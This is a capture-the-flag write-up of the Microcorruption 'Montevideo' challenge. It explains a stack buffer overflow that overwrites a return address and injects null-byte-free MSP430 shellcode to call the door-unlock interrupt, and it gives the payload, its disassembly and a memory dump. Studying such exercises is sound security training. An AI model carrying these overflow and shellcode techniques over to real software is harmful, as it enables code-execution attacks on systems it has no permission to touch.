# Montevideo
## Completed 8/25/20
###### Flag: AAAA3d40017f3d538d100d12b0124c45f043
- convert to hex
- 4 garbage characters


# Functions
    main - 0x4438
    conditional_unlock_door - 0x4446
    login - 0x44f4
    strcpy - 0x45dc

# Solution
This challenge is a culmination of previous challenges seen on microcorruption. Once again, a buffer overflow is needed to overwrite the return address at the end on the program. Also, the <unlock_door> function is conditional so we will need to inject our own assembly code to unlock the door. However, on executing the program a couple times we notice that the function <strcpy> takes the contents of our password and moves it into memory. This is the key of this challenge when <strcpy> gets executed it takes into account null characters. Unforunately, for us the value we need to pass into <INT> is 0x007f. Because of this when the 00 is read the strcpy thinks that is the end of the "str" and does not copy the rest of our injected code. Now we have to figure out how to inject a combination of assembly code instructions that accomplish what we want while also not using 0x00 ever in the injected code. In this case I used the following code to achieve what was needed to unlock the door.



## Dissasembly 

    3d40 017f    mov #0x7f01, r13

    3d53         add #-0x1, r13

    8d10         swpb r13

    0d12         push r13

    b012 4c45    call #0x454c


To reiterate what I am doing here instead of pushing 7f onto the stack I get around the 0x00 byte by turning it into 0x7f01. Now to get rid of that 1, I simply add a -1 to the register. now I have 0x7f00. At this point all that is needed is to swpb to get me exactly what is needed to unlock the door 0x007f. Finally, pushing the register onto the stack and calling the function achieves what is needed.




## Memory Dump

    43e8:   0024 3000 1e45 aaaa   .$0..E..

    43f0:   3d40 017f 3d53 8d10   =@.=S..

    43f8:   0d12 b012 4c45 f043   ....LE.C



